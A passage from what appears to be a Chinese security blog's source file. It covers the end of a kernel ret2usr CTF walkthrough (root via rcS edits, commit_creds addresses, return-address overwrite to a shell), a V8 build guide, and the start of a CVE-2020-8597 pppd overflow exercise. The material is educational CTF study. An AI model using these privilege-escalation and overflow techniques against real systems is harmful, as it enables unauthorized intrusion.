+<p>（2）解压initramfs.cpio文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cpio -idvm &lt; ..&#x2F;initramfs.cpio</span><br></pre></td></tr></table></figure>
+
+<p>（3）修改suid</p>
+<p>进入etc/init.d/rcS，将1000修改为0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ gedit etc&#x2F;init.d&#x2F;rcS</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/22/ret2usr/image-20200903110009863.png" alt="image-20200903110009863"></p>
+<p>（4）重新打包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">level1&#x2F;myimage$ find . | cpio -H newc -o &gt; ..&#x2F;initramfs.cpio</span><br><span class="line">level1&#x2F;myimage$ cd ..</span><br></pre></td></tr></table></figure>
+
+<p>（5）再次执行两条命令即可</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903110203208.png" alt="image-20200903110203208"></p>
+<p>已经是root权限了</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903110251793.png" alt="image-20200903110251793"></p>
+<p><code>prepare_kernel_cred</code>的地址为<code>0xffffffff810b9d80</code></p>
+<p><code>commit_creds</code>的地址为<code>0xffffffff810b99d0</code></p>
+<blockquote>
+<p>疑问解答：此时已经获得root权限了，不就可以直接cat /flag了？</p>
+<p>实际题目中，不会把真的flag放文件里给你，而是在远程环境了。但是本地的地址和远程的地址是一样的，所以，可以通过这种方法得到本地的用户权限，找到prepare_kernel_cred和commit_creds的地址，但是没有办法直接获得flag。</p>
+</blockquote>
+<h5 id="查找基地址"><a href="#查找基地址" class="headerlink" title="查找基地址"></a>查找基地址</h5><p>以root权限运行，参考上面（修改etc/init.d/rcS）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules </span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure>
+
+<h5 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h5><p>（1）编辑startvm.sh，端口可以修改</p>
+<p>0x7ffd958d7e08</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905004851358.png" alt="image-20200905004851358"></p>
+<p>（2）执行<code>./startvm.sh</code></p>
+<p>（3）打开新窗口，在<code>level1</code>目录下执行<code>gdb exp</code></p>
+<p>（4）远程连接，<code>target remote :1234</code></p>
+<p>（5）下断点（ida里面的地址+基地址），继续执行</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905103517562.png" alt="image-20200905103517562"></p>
+<p><img src="/2020/10/22/ret2usr/image-20200905103116021.png" alt="image-20200905103116021"></p>
+<p>（6）在原来的窗口，执行exp</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905103146690.png" alt="image-20200905103146690"></p>
+<p>（7）接着，就可以正常调试了</p>
+<h5 id="执行exp步骤"><a href="#执行exp步骤" class="headerlink" title="执行exp步骤"></a>执行exp步骤</h5><p>（1）编译exp.c</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gcc exp.c -o exp -w -static -fPIC</span><br></pre></td></tr></table></figure>
+
+<p>（2）将initramfs.cpio解压到myimage文件夹</p>
+<p>（3）将exp移入myimage文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp exp myimage&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>（4）重新打包，执行./startvm.sh</p>
+<p>exp已在/目录下了</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903111831663.png" alt="image-20200903111831663"></p>
+<h5 id="疑惑的0x88和0x80"><a href="#疑惑的0x88和0x80" class="headerlink" title="疑惑的0x88和0x80"></a>疑惑的0x88和0x80</h5><p>一开始，说将<code>0x100</code>的用户数据拷贝到内核栈上，高度只有<code>0x88</code>，后面又说实际上缓冲区距离<code>rbp</code>是<code>0x80</code>，有点迷。</p>
+<p>一开始的0x88，指的是初始化的时候。</p>
+<p>但是程序初始化的时候，有个压栈操作，所以少减了一个8</p>
+<p><img src="/2020/10/22/ret2usr/image-20200903112746033.png" alt="image-20200903112746033"></p>
+<h5 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h5><p>init_module是内核加载模块的时候调用的</p>
+<p>开始的时候（内核加载模块）：调用init_module</p>
+<p>中间的时候：</p>
+<p>我们调用ioctl调用了sub_0函数</p>
+<p>ioctl的参数就是sub_0的参数</p>
+<p><img src="/2020/10/22/ret2usr/image-20200905120014834.png" alt="image-20200905120014834"></p>
+<p><code>return (signed int)copy_from_user(&amp;v4, v2, 256LL);</code></p>
+<p>我们通过buf覆盖栈上的返回地址，执行v2中copy过去的templine函数，获得shell</p>
+<p>结束的时候：cleanup_module</p>
 ]]></content>
+      <tags>
+        <tag>kernel pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>v8环境搭建</title>
+    <url>/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭个环境而已，花了我n久，哭泣。。。</p>
+<p>这里就讲下自己搭环境的经过，，，</p>
+<hr>
+<p>使用的环境：ubuntu 18.04</p>
+<h2 id="初次尝试：本地"><a href="#初次尝试：本地" class="headerlink" title="初次尝试：本地"></a>初次尝试：本地</h2><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p>主要参考的是这两篇博客：</p>
+<p><a href="https://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/05/06/v8/</a></p>
+<p><a href="https://bbs.pediy.com/thread-252812.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252812.htm</a></p>
+<hr>
+<h3 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h3><blockquote>
+<p>我的本地代理，开了没用，不知道为什么，本机可以上google，但是虚拟机里怎么都不可以，，，然后，，选择在虚拟机里面使用vpn</p>
+</blockquote>
+<p>这个是我用的：<a href="https://neworld.date/user（简单好用而且不贵）" target="_blank" rel="noopener">https://neworld.date/user（简单好用而且不贵）</a></p>
+<p>linux的教程：<a href="https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）" target="_blank" rel="noopener">https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）</a></p>
+<p>别的问题不大，注意的两点是：</p>
+<p>1.要使用的时候，需要在命令前面加上<code>proxychains4</code></p>
+<p>2.选择节点的时候，一定要选择有人的</p>
+<p>3.一定是root账户</p>
+<p>4.在/root目录下</p>
+<p>执行命令 <code>proxychains4 curl myip.ipip.net</code> 。如果显示empty server类似的</p>
+<p>那就重新来一遍（建议：wmware弄个快照，，每次都重新配，心真的很累），，，我当时玄学，学校里的网不行（貌似是因为校园网不能翻外网），连了自己的热点就可以了。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure>
+
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="depot-tools"><a href="#depot-tools" class="headerlink" title="depot_tools"></a>depot_tools</h5><p>这个工具是用来得到v8源码的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+
+<h5 id="ninja"><a href="#ninja" class="headerlink" title="ninja"></a>ninja</h5><p>这个工具是用来编译v8的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;github.com&#x2F;ninja-build&#x2F;ninja.git</span><br><span class="line">cd ninja &amp;&amp; .&#x2F;configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+
+<p>echo两句命令，主要是写入环境变量，后期fetch v8的时候，可能会说找不到fetch命令，可能就是环境变量没了，可以通过vim ~/.bashrc，查看最后面是否有下面这两句话，没有的话，加上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;</span><br><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;</span><br><span class="line">bash									&#x2F;&#x2F;载入环境变量</span><br></pre></td></tr></table></figure>
+
+<p>然后就是编译启动，我卡死在了v8，真的很慢，而且最后报错，，，出错，网上看了好多，也没解决，，，TAT</p>
+<p>后面的步骤</p>
+<h4 id="v8编译"><a href="#v8编译" class="headerlink" title="v8编译"></a>v8编译</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8&amp;&amp; gclient sync</span><br><span class="line">$ tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">$ ninja -C out.gn&#x2F;x64.debug</span><br></pre></td></tr></table></figure>
+
+<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;d8</span><br><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<p>初始尝试失败，，搞了好久都没出来，，，，但是网上大部分都是这种方法</p>
+<hr>
+<h2 id="二次尝试"><a href="#二次尝试" class="headerlink" title="二次尝试"></a>二次尝试</h2><h3 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h3><p><a href="https://eternalsakura13.com/2018/06/26/v8_environment/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/06/26/v8_environment/</a></p>
+<h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><blockquote>
+<p>sakura为我们提供了第二种方法，我一开始试了下，但是谷歌云搞不来，没有信用卡啥的。但是后来只能尝试这个，所以找了下其他国外的云服务器。</p>
+<p>不需要代理啥的，真是舒服。</p>
+<p>知乎上的这篇给了较好的帮助：<a href="https://zhuanlan.zhihu.com/p/130402190" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/130402190</a></p>
+</blockquote>
+<p>我使用的是狗云，进来，“创建景点云服务器”，我一开始用的10G的硬盘，编译的时候发现太小了，然后只好销毁重来一个（这个只要三个工作日内，支持销毁退款）</p>
+<p>操作系统选择这个：CentOS 7 BBR，ubuntu 18我也用了，但还是出问题了</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010130803778.png" alt="image-20201010130803778"></p>
+<p>然后进入“我的经典云服务器”，启动，用xshell远程连过去</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201010131058668.png" alt="image-20201010131058668"></p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">export PATH&#x3D;&#96;pwd&#96;&#x2F;depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">cd ~&#x2F;v8&#x2F;v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598(2019-starctf这道入门题)</span><br><span class="line">gclient sync</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.release(这个真的很慢，要耐心)</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.release # Release version</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.debug # Debug version</span><br></pre></td></tr></table></figure>
+
+<h5 id="release版本和debug版本"><a href="#release版本和debug版本" class="headerlink" title="release版本和debug版本"></a>release版本和debug版本</h5><p>上面的12-15行中，12-13两行下载的是release版本，14-15行下载的是debug版本。release版本可以正常运行，但是有些调试信息不能用，如job命令，执行起来的时候，也会告诉我们，没有调试的符号。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg: loaded 186 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print&#x2F;break)</span><br><span class="line">Reading symbols from .&#x2F;d8...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
+
+<p>debug就是调试版本，可以输入更多的调试信息。虽然debug看着好，但是，，，后面有点问题，，，两个都下过来就好。</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201015161210557.png" alt="image-20201015161210557"></p>
+<p>下过来之后，是这样的。</p>
+<p>我们进入x64.debug就可以调试状态下运行d8。。同理release</p>
+<h4 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">tar -czvf v8.tar v8</span><br><span class="line">sudo yum install vsftpd -y</span><br><span class="line">systemctl start vsftpd.service(在CentOS7和它之前，启动vsftpd服务的指令是 service vsftpd start，之后要使用新指令)</span><br><span class="line">sudo netstat -nltp | grep 21</span><br><span class="line">cp v8.tar &#x2F;var&#x2F;ftp&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>然后，浏览器就可以访问到了，点击下载即可。</p>
+<p><img src="/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201011095616016.png" alt="image-20201011095616016"></p>
+<p>哇哇哇哇，感天动地，终于搞定了。</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>实例程序(test.js)：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="v8的gdb"><a href="#v8的gdb" class="headerlink" title="v8的gdb"></a>v8的gdb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;tools</span><br><span class="line">mv gdbinit gdbinit_v8</span><br><span class="line">cp gdbinit_v8 ~&#x2F;.gdbinit_v8</span><br><span class="line">cd ~ </span><br><span class="line">vim .gdbinit</span><br><span class="line">#加入下面内容</span><br><span class="line">source ~&#x2F;.gdbinit_v8</span><br><span class="line">source ~&#x2F;v8&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support.py</span><br></pre></td></tr></table></figure>
+
+<p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;</span><br><span class="line">将test.js放到该目录下</span><br><span class="line">gdb .&#x2F;d8</span><br><span class="line">gdb-peda$ set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">gdb-peda$ r</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;winter&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x3847d864df19(这个地址根据第九行那里显示地址)</span><br><span class="line">0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>v8的gdb也可以了</p>
+<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tools&#x2F;dev&#x2F;gm.py x64.debug d8</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>v8</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>固件iot基础</title>
+    <url>/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
+<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
+<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
+<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829170912807.png" alt="image-20200829170912807"></p>
+<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
+<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
+<ul>
+<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
+<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
+</ul>
+<p>使用：</p>
+<ul>
+<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
+<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
+</ul>
+<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
+<ul>
+<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174231769.png" alt="image-20200829174231769"></p>
+<ul>
+<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174236510.png" alt="image-20200829174236510"></p>
+<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
+<ol>
+<li>nday cve 漏洞分析和利用；</li>
+<li>mips 指令集栈溢出漏洞的调试和利用</li>
+</ol>
+<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
+<p>漏洞点：</p>
+<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121124694.png" alt="image-20200830121124694"></p>
+<p>操作步骤：</p>
+<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
+<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121439048.png" alt="image-20200830121439048"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p>（2）编辑<code>etc/inittab</code></p>
+<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>
+
+<p>（3）修改<code>start.sh</code>文件</p>
+<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
+<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
+<p>（5）重新打包<code>rootfs.img</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p>（6）运行</p>
+<p><code>./start.sh</code></p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830122145171.png" alt="image-20200830122145171"></p>
+<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
+
+<p>再打开一个新的窗口</p>
+<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br></pre></td></tr></table></figure>
+
+<p>接着</p>
+<p>（1）下载ppp的源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>
+
+<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>
+
+<p>修改为</p>
